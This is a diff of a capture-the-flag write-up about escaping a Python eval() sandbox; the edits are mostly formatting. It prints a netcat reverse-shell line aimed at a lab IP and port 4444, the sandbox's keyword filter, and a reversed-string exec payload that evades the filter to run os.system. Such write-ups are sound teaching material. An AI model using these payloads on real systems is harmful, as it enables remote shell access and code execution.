@@ -60,7 +60,7 @@ Login requires to solve a math problem, using python `eval()` you can solve it
 
 I tried to spawn a reverse shell using :
 
-```
+```sh
 __import__('os').system('nc -e /bin/sh 10.0.2.15 4444')
 ```
 But the website detected my malicious code
@@ -78,11 +78,11 @@ Let's read it
 wget http://10.0.2.240/noimportos_sandbox.py
 ```
 
-```
+```sh
 cat noimportos_sandbox.py
 ```
 
-```python3
+```python
 def check_if_safe(code: str) -> bool:
     if 'import' in code: # import is too dangerous
         return False
@@ -101,15 +101,17 @@ we are not allowed to use `import` , `os` and `open` in our code
 After a google Searching if found this nice article : [python-sandbox-escape](https://programmer.help/blogs/python-sandbox-escape.html)
 I use the below code :
 
-```python3
+```python
 exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
 ```
 
 #### Reverse order | Explanation of the exploit
 
 The `noimportos_sandbox.py` checks the input string if contains these 3 strings : `import` , `os` and `open`
+
 We can simple execute these disallowed values using the reverse order,
 For example the `tropmi[::-1]` == `import`
+
 Our stealth code is `exec(')"imaohw"(metsys.so ;so tropmi'[::-1])` equals to : `exec("import os; os.system("whoami")`
 
 ![image](/assets/img/pylington/6.PNG)
